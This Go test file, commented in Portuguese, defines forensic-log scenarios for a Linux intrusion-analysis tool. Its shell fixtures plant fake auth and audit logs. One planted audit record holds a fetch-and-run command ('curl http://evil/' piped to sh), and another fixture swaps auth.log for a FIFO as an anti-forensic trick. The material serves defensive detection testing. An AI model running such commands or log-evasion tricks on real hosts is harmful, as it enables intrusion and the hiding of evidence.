package scenario

// O CONTEÚDO dos logs: o host como testemunha do próprio passado.
//
// O resto da ferramenta responde "o que existe AGORA?" e o drift responde "o
// que MUDOU?". Nenhum dos dois alcança o que aconteceu e não deixou objeto — o
// binário rodado às 03:00 e apagado às 03:05.
//
//	G1  chave usada e removida        o fingerprint só existe no log
//	G2  sudo para /tmp                o COMMAND só existe no log
//	G3  trilha de auditoria furada    audit_lost + DAEMON_ABORT
//	G4  vão de tempo entre gerações   apagar linha não fura a rotação
//	G5  journald-only                 ESCOPO: a cobertura NÃO pode cair
//	G6  auth.log trocado por fifo     LACUNA: a cobertura TEM que cair
//	G7  host limpo                    silêncio, que é o contrato mais caro
//	G8  a mesma linha em dois arquivos  um evento, não dois
//	G9  auditd parado sem perda       MANUAL, nunca aviso
//	G10 auth.log 0640 sem privilégio  a forma de campo da lacuna
//	G11 modo IMAGE                    o fuso vem do TZif do ALVO
//	G12 --no-logs                     escolha declarada, nunca silêncio
//
// # Por que data FIXA e --logs-all
//
// O ano de uma linha de syslog é inferido do mtime do arquivo, e a janela padrão
// de sete dias decide quais arquivos abrir. Um plantio com data relativa ao dia
// da execução tornaria o contrato dependente de quando a suíte roda — e um
// cenário que passa em agosto e falha em janeiro é pior que cenário nenhum.
// Datas fixas no passado, mtime fixado com `touch -t`, e `--logs-all` para que a
// janela não descarte o arquivo: o mesmo resultado hoje e daqui a dois anos.

func init() {
	Register(Scenario{
		ID:   "G1-chave-usada-fora-das-locais",
		Desc: "login aceito com chave cujo fingerprint não está em authorized_keys nenhum",
		// É a coisa que SÓ o log tem: o wtmp registra que alguém entrou, não com
		// o quê. Com o fingerprint dá para perguntar se a chave ainda está
		// autorizada — e quando não está, ou ela foi removida depois de usada,
		// ou a autorização veio de outro lugar.
		Images: matriz,
		Args:   []string{"--only", "priv", "--logs-all"},
		Plant:  chaveForaDoAuthorizedKeys,
		Expect: []Expect{
			// MANUAL: desligamento de conta e rotação de chave deixam a mesma
			// forma, e foi o T1 — o servidor de produção de referência — que
			// cobrou essa decisão ao ganhar dois avisos que não valiam a atenção.
			{ID: "logs.pubkey_not_in_local_keys", Sev: "MANUAL",
				Subject: "SHA256:naoEstaEmLugarNenhum"},
			{ID: "logs.pubkey_not_in_local_keys", Evidence: "não aparece em nenhum"},
			// O horizonte precisa viajar junto: sem ele o achado carrega uma
			// afirmação implícita sobre tudo que não apareceu.
			{ID: "logs.pubkey_not_in_local_keys", Evidence: "observado de forma contínua"},
		},
		Exit: -1,
	})

	Register(Scenario{
		ID:   "G2-sudo-para-tmp",
		Desc: "sudo executou binário de /tmp: o COMMAND só existe no log",
		// O processo já morreu e o arquivo pode ter sido apagado. A linha do
		// sudo é o que resta, e ela diz o caminho inteiro.
		Images: matriz,
		Args:   []string{"--only", "priv", "--logs-all"},
		Plant:  sudoParaTmp,
		Expect: []Expect{
			{ID: "logs.sudo_unusual_target", Sev: "WARN", Subject: "/tmp/.upd"},
			{ID: "logs.sudo_unusual_target", Evidence: "não é de onde o sistema executa"},
		},
		Exit: 1,
	})

	Register(Scenario{
		ID:   "G3-trilha-de-auditoria-furada",
		Desc: "audit_lost e DAEMON_ABORT: o que não foi registrado não volta",
		// O plantio também exercita o MONTADOR: quatro registros do mesmo
		// serial, `a0` relativo e em hex, argumento partido em pedaços, e um
		// caminho com ESPAÇO — que o kernel obriga a sair em hex
		// (audit_string_contains_control manda para hex todo byte < 0x21).
		Images: matriz,
		Args:   []string{"--only", "logs", "--logs-all"},
		Plant:  auditComPerdaEExecve,
		Expect: []Expect{
			{ID: "logs.audit_records_lost", Sev: "WARN"},
			{ID: "logs.audit_records_lost", Evidence: "não volta"},
			// E a cobertura precisa DIZER que a família audit foi observada: é
			// isso que prova que os registros foram parseados e datados.
			{ID: "logs.source_coverage", Evidence: "audit: contínuo de"},
		},
		Exit: 1,
	})

	Register(Scenario{
		ID:   "G4-vao-de-tempo-entre-geracoes",
		Desc: "dias sem uma linha de autenticação entre duas gerações consecutivas",
		// Apagar LINHA é mais barato que apagar arquivo, e não fura a sequência
		// de rotação — que é o que o antiforense.log_rotation_gap procura. O que
		// sobra é o tempo.
		Images: matriz,
		Args:   []string{"--only", "logs", "--logs-all"},
		Plant:  vaoEntreGeracoes,
		Expect: []Expect{
			// MANUAL, e não aviso: ausência de linha não prova remoção. Host
			// desligado e servidor ocioso produzem a mesma forma, e a promoção
			// pertence à correlação com o wtmp, que tem testemunha independente.
			{ID: "antiforense.log_time_gap", Sev: "MANUAL"},
			{ID: "antiforense.log_time_gap", Evidence: "sem UMA linha de autenticação"},
			{ID: "antiforense.log_time_gap", NextStep: "testemunha INDEPENDENTE"},
		},
		Exit: -1,
	})

	Register(Scenario{
		ID:   "G5-journald-only-eh-escopo",
		Desc: "host sem log em TEXTO: a pergunta não cabe, e a cobertura NÃO cai",
		// Debian 12 e Fedora não instalam rsyslog. Se a ferramenta calasse,
		// metade da frota sairia limpa por construção; se declarasse lacuna, o
		// exit 0 ficaria inalcançável para sempre — e lacuna que nunca fecha é
		// lacuna que ninguém lê. É o precedente do `dateext`.
		Images: matriz,
		Args:   []string{"--only", "logs"},
		Plant:  semLogEmTexto,
		Expect: []Expect{
			{ID: "logs.source_coverage", Sev: "INFO", Evidence: "journald-only"},
			{ID: "logs.source_coverage", Evidence: "é escopo, não lacuna"},
		},
		Forbid: []string{"antiforense.log_time_gap", "logs.audit_records_lost"},
		// A afirmação central deste cenário: escopo NÃO é lacuna.
		ForbidGap: []string{"não pôde ser lido"},
		MaxWarn:   SemAvisos,
		Exit:      -1,
	})

	Register(Scenario{
		ID:   "G6-auth-log-desviado-eh-lacuna",
		Desc: "o auth.log foi trocado por um fifo: existe, não se lê, e NÃO é fora de escopo",
		// O par exato do G5, e a diferença entre os dois é o que separa escopo de
		// lacuna: lá o arquivo NÃO EXISTE, aqui ele existe e não entrega
		// conteúdo. Apontar o log para outro lugar é a forma mais barata de
		// anti-forense que existe — a mesma que o antiforense.shell_history já
		// reconhece para o histórico —, e ela não pode fazer a ferramenta
		// concluir que o host não tem log.
		//
		// O plantio é de FIFO, e não de permissão, por uma limitação do harness:
		// o `-u` vale para o contêiner inteiro, então plantar como nobody não
		// consegue nem escrever em /var/log, e plantar como root faz o scan ler
		// tudo. A variante de permissão está travada em teste unitário, que
		// controla o uid.
		Images: matriz,
		Args:   []string{"--only", "logs", "--logs-all"},
		Plant:  authLogDesviado,
		ExpectGap: []string{
			"/var/log/auth.log existe e NÃO é arquivo comum",
		},
		// Sem achado NENHUM: o que este cenário afirma é a LACUNA. Um aviso aqui
		// significaria a ferramenta concluindo a partir de um arquivo que ela não
		// conseguiu abrir.
		MaxWarn:          SemAvisos,
		MustBeIncomplete: true,
		Exit:             1,
	})

	Register(Scenario{
		ID:   "G7-host-limpo-fica-calado",
		Desc: "auth.log de rotina: sudo de administração e logins normais, e nenhum achado",
		// O contrato mais caro da feature. Um servidor real tem milhares de
		// linhas com `error`, `failed` e `root`, e transformá-las em achado
		// faria a ferramenta descrever o clima. É este cenário que impede a
		// feature de virar antivírus de regex.
		Images:  matriz,
		Args:    []string{"--only", "logs", "--logs-all"},
		Plant:   authLogDeRotina,
		Forbid:  []string{"antiforense.log_time_gap", "logs.audit_records_lost"},
		MaxWarn: SemAvisos,
		Exit:    -1,
	})

	Register(Scenario{
		ID:   "G8-mesma-linha-em-dois-arquivos",
		Desc: "o rsyslog duplica a mensagem do sshd: um evento, não dois",
		// Conforme a configuração, a mesma linha cai em auth.log E em syslog.
		// Agregar sem deduplicar contaria a mesma coisa duas vezes — e a
		// contagem é o que decide se algo foi uma tentativa ou uma campanha.
		Images: matriz,
		Args:   []string{"--only", "logs", "--logs-all"},
		Plant:  mesmaLinhaEmDoisArquivos,
		Expect: []Expect{
			{ID: "logs.source_coverage", Evidence: "1 evento(s) normalizados de 2 arquivo(s)"},
		},
		Exit: -1,
	})

	Register(Scenario{
		ID:   "G9-auditd-parado-eh-manual",
		Desc: "DAEMON_END sozinho: parada administrativa não é evasão",
		// Atualização de pacote e mudança de regra param o auditd. Tratar isso
		// como aviso gritaria em toda frota que mantém o auditd atualizado — e
		// a diferença entre parar e PERDER registro é do check, não do coletor.
		Images: matriz,
		Args:   []string{"--only", "logs", "--logs-all"},
		Plant:  auditdParadoLimpo,
		Expect: []Expect{
			{ID: "logs.audit_records_lost", Sev: "MANUAL"},
			{ID: "logs.audit_records_lost", Evidence: "parada limpa"},
		},
		ForbidFinding: []Expect{
			{ID: "logs.audit_records_lost", Sev: "WARN"},
		},
		Exit: -1,
	})

	Register(Scenario{
		ID:   "G10-auth-log-sem-privilegio-eh-lacuna",
		Desc: "auth.log 0640 root:adm e coleta SEM privilégio: lacuna, e a cobertura cai",
		// A FORMA DE CAMPO da lacuna, e o caso cotidiano de quem varre sem root:
		// em Debian o auth.log é 0640 root:adm por desenho, e uma varredura sem
		// privilégio bate em EACCES.
		//
		// O G6 planta um fifo porque o `-u` do harness vale para o contêiner
		// inteiro. Aqui o truque é o do X2: o contêiner roda como ROOT, o
		// plantio cria o arquivo com dono e modo reais, e o `collect` desce de
		// privilégio dentro do próprio script. Os dois cenários são
		// complementares — um é o arquivo trocado de lugar, o outro é o arquivo
		// que o uid não alcança.
		Images: matriz,
		Cmd:    "analyze",
		Plant:  authLogSoParaRoot,
		Args:   []string{"--only", "logs", "/tmp/cego.json"},
		ExpectGap: []string{
			"auth.log não pôde ser lido",
		},
		// O que este cenário afirma é a LACUNA. Um aviso aqui seria a ferramenta
		// concluindo a partir de um arquivo que ela não conseguiu abrir.
		MaxWarn:          SemAvisos,
		MustBeIncomplete: true,
		Exit:             1,
	})

	Register(Scenario{
		ID:   "G11-modo-image-le-o-fuso-do-alvo",
		Desc: "rootfs montado de fora: o horário do log sai do TZif do ALVO, não do analista",
		// A feature declara SourceLive|SourceImage, e este é o caminho da §35.6 —
		// varrer a imagem quando o userland do host não é confiável.
		//
		// O que SÓ o modo image prova é a afirmação escrita no coletor: o fuso é
		// decodificado dos BYTES de /etc/localtime do alvo, e nunca por
		// time.LoadLocation, que leria o zoneinfo de quem investiga. Aqui o alvo
		// está em +05:45 — um offset que máquina de CI nenhuma tem —, então
		// `Jan 10 03:00:00` local só pode sair como 21:15Z se os bytes certos
		// foram lidos.
		//
		// Só debian: a alpine base não traz zoneinfo, e montar um TZif à mão em
		// shell testaria o plantio em vez do produto.
		Images: []string{"debian:12"},
		Mode:   Image,
		Args:   []string{"--only", "logs", "--logs-all"},
		Plant:  fusoDeKathmandu,
		Expect: []Expect{
			{ID: "logs.source_coverage", Evidence: "T21:15:00Z"},
		},
		ForbidOutput: []string{
			// Se o /etc/localtime não tivesse sido lido, o próprio check diria.
			"o fuso do alvo (/etc/localtime) não foi lido",
		},
		Exit: -1,
	})

	Register(Scenario{
		ID:   "G12-no-logs-nao-vira-silencio",
		Desc: "--no-logs: a escolha do operador é DECLARADA, e não vira 'não encontrei'",
		// O plantio é o do G4 — o vão entre gerações, que dispara sem a flag.
		// Com ela, o achado tem de sumir E a cobertura tem de cair: desligar a
		// leitura é escolha de quem roda, e escolha declarada não é ausência de
		// fato. É esse valor que faz um analyze sobre dump de `wtf` responder
		// NÃO VERIFICADO em vez de "não achei".
		Images:    matriz,
		Args:      []string{"--only", "logs", "--no-logs"},
		Plant:     vaoEntreGeracoes,
		Forbid:    []string{"antiforense.log_time_gap"},
		ExpectGap: []string{"DESLIGADA"},
		MaxWarn:   SemAvisos,
		// A cobertura CAI: a pergunta cabia neste host e ninguém a fez.
		MustBeIncomplete: true,
		Exit:             1,
	})
}

// ---------------------------------------------------------------------------
// Os plantios. Data FIXA no passado e mtime fixado: ver o comentário do topo.

// authLogSoParaRoot é a forma de campo: 0640 root:adm, como o Debian entrega.
//
// O contêiner roda como root para que o plantio consiga o dono e o modo reais; o
// `collect` desce para nobody dentro do script, e é essa coleta que o cenário
// analisa. É o idioma do X2, e sem ele a permissão não é reproduzível aqui.
const authLogSoParaRoot = `
mkdir -p /var/log
cat > /var/log/auth.log <<'EOF'
Jan 10 03:00:00 h sshd[1]: Accepted password for ana from 10.0.0.1 port 5 ssh2
EOF
chown 0:0 /var/log/auth.log
chmod 640 /var/log/auth.log
su nobody -s /bin/sh -c '/aletheia collect --out /tmp/cego.json --logs-all'
`

// fusoDeKathmandu põe o ALVO em +05:45, que máquina de CI nenhuma tem.
const fusoDeKathmandu = `
mkdir -p /var/log
cp /usr/share/zoneinfo/Asia/Kathmandu /etc/localtime
cat > /var/log/auth.log <<'EOF'
Jan 10 03:00:00 h sshd[1]: Accepted password for ana from 10.0.0.1 port 5 ssh2
EOF
`

const chaveForaDoAuthorizedKeys = `
mkdir -p /var/log /root/.ssh
cat > /var/log/auth.log <<'EOF'
Jan 10 03:00:00 h sshd[1234]: Accepted publickey for root from 185.10.2.4 port 55234 ssh2: ED25519 SHA256:naoEstaEmLugarNenhum
Jan 10 03:00:05 h sshd[1234]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
EOF
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExemploDeChaveLegitima operador@estacao' > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
touch -t 202501120000 /var/log/auth.log
`

const sudoParaTmp = `
mkdir -p /var/log
cat > /var/log/auth.log <<'EOF'
Jan 10 02:11:03 h sudo[5]:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/tmp/.upd
Jan 10 02:11:04 h sudo[5]: pam_unix(sudo:session): session opened for user root by deploy(uid=1000)
Jan 10 02:18:51 h sudo[9]:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/tmp/.upd
EOF
touch -t 202501120000 /var/log/auth.log
`

// auditComPerdaEExecve exercita o montador junto com o achado.
//
// O `a0` é relativo e vem em hex; o argumento longo chega partido em
// `a2_len`/`a2[0]`/`a2[1]`; e o PATH tem ESPAÇO — que o kernel obriga a sair em
// hex. Os três são o que separa ler audit.log de fingir que se leu.
const auditComPerdaEExecve = `
mkdir -p /var/log/audit /var/log
cat > /var/log/audit/audit.log <<'EOF'
type=SYSCALL msg=audit(1736500000.100:4001): arch=c000003e syscall=59 success=yes exit=0 ppid=900 pid=901 auid=1001 uid=1001 gid=1001 euid=0 comm="sh" exe="/bin/dash" key="exec"
type=EXECVE msg=audit(1736500000.100:4001): argc=3 a0=2E2F78 a1="-c" a2_len=23 a2[0]="curl http://evil/" a2[1]="x | sh"
type=CWD msg=audit(1736500000.100:4001): cwd="/tmp"
type=PATH msg=audit(1736500000.100:4001): item=0 name=2F746D702F756D206172717569766F inode=99 dev=fd:01 mode=0100755 ouid=0 ogid=0
type=DAEMON_ABORT msg=audit(1736500100.000:4002): op=error auid=0 pid=1 res=failed
EOF
cat > /var/log/kern.log <<'EOF'
Jan 10 05:00:00 h kernel: [12345.678901] audit: audit_lost=42 audit_rate_limit=0 audit_backlog_limit=64
EOF
touch -t 202501120000 /var/log/audit/audit.log /var/log/kern.log
`

const vaoEntreGeracoes = `
mkdir -p /var/log
cat > /var/log/auth.log.1 <<'EOF'
Jan 08 09:00:00 h sshd[1]: Accepted password for ana from 10.0.0.1 port 5 ssh2
Jan 08 12:30:00 h sshd[1]: Accepted password for ana from 10.0.0.1 port 5 ssh2
EOF
cat > /var/log/auth.log <<'EOF'
Jan 11 08:00:00 h sshd[1]: Accepted password for ana from 10.0.0.1 port 5 ssh2
Jan 11 09:00:00 h sshd[1]: Accepted password for ana from 10.0.0.1 port 5 ssh2
EOF
touch -t 202501120000 /var/log/auth.log /var/log/auth.log.1
`

// semLogEmTexto é o host moderno: só o journal, que é binário.
const semLogEmTexto = `
rm -f /var/log/auth.log* /var/log/secure* /var/log/syslog* /var/log/messages* \
      /var/log/kern.log* /var/log/cron* 2>/dev/null || true
mkdir -p /var/log/journal/1234567890
printf 'LPKSHHRH\000\000\000\000' > /var/log/journal/1234567890/system.journal
`

// authLogDesviado troca o log por um FIFO: ele existe, e não entrega conteúdo.
//
// A forma de campo mais comum é outra — 0640 root:adm, ilegível sem root —, e
// ela não pode ser plantada aqui: o `-u` do harness vale para o contêiner
// inteiro, então plantar como nobody não escreve em /var/log, e plantar como
// root faz o scan ler tudo. A variante de permissão está travada em teste
// unitário, que controla o uid.
//
// O fifo não é substituto pobre: ele é o caso adversarial de verdade. Um
// `mkfifo` (ou um link para /dev/null) no lugar do auth.log some do inventário,
// que filtra arquivo comum — e fazia a família inteira parecer inexistente.
const authLogDesviado = `
mkdir -p /var/log
rm -f /var/log/auth.log
mkfifo /var/log/auth.log
`

// authLogDeRotina é o que um servidor real escreve num dia normal: instalação
// de pacote com sudo, logins da equipe, sessões abrindo e fechando, e as
// tentativas de força bruta que todo host com SSH exposto recebe.
const authLogDeRotina = `
mkdir -p /var/log
cat > /var/log/auth.log <<'EOF'
Jan 10 08:00:01 h sshd[100]: Accepted publickey for ana from 10.0.0.5 port 5100 ssh2: ED25519 SHA256:chaveDaAna
Jan 10 08:00:01 h sshd[100]: pam_unix(sshd:session): session opened for user ana(uid=1000) by (uid=0)
Jan 10 08:02:11 h sudo[110]:      ana : TTY=pts/0 ; PWD=/home/ana ; USER=root ; COMMAND=/usr/bin/apt-get install -y nginx
Jan 10 08:02:11 h sudo[110]: pam_unix(sudo:session): session opened for user root by ana(uid=1000)
Jan 10 08:02:40 h sudo[110]: pam_unix(sudo:session): session closed for user root
Jan 10 08:05:00 h sshd[100]: Received disconnect from 10.0.0.5 port 5100:11: disconnected by user
Jan 10 08:05:00 h sshd[100]: pam_unix(sshd:session): session closed for user ana
Jan 10 09:13:22 h sshd[201]: Invalid user admin from 203.0.113.7 port 40001
Jan 10 09:13:22 h sshd[201]: Connection closed by invalid user admin 203.0.113.7 port 40001 [preauth]
Jan 10 09:13:31 h sshd[202]: Failed password for root from 203.0.113.7 port 40012 ssh2
Jan 10 09:13:33 h sshd[202]: Connection closed by authenticating user root 203.0.113.7 port 40012 [preauth]
Jan 10 10:17:01 h CRON[300]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)
Jan 10 10:17:01 h CRON[300]: pam_unix(cron:session): session closed for user root
EOF
touch -t 202501120000 /var/log/auth.log
`

const mesmaLinhaEmDoisArquivos = `
mkdir -p /var/log
L='Jan 10 03:00:00 h sshd[1]: Accepted password for ana from 10.0.0.1 port 5 ssh2'
echo "$L" > /var/log/auth.log
echo "$L" > /var/log/syslog
touch -t 202501120000 /var/log/auth.log /var/log/syslog
`

const auditdParadoLimpo = `
mkdir -p /var/log/audit
cat > /var/log/audit/audit.log <<'EOF'
type=DAEMON_END msg=audit(1736500200.000:4100): op=terminate auid=0 pid=1 res=success
EOF
touch -t 202501120000 /var/log/audit/audit.log
`
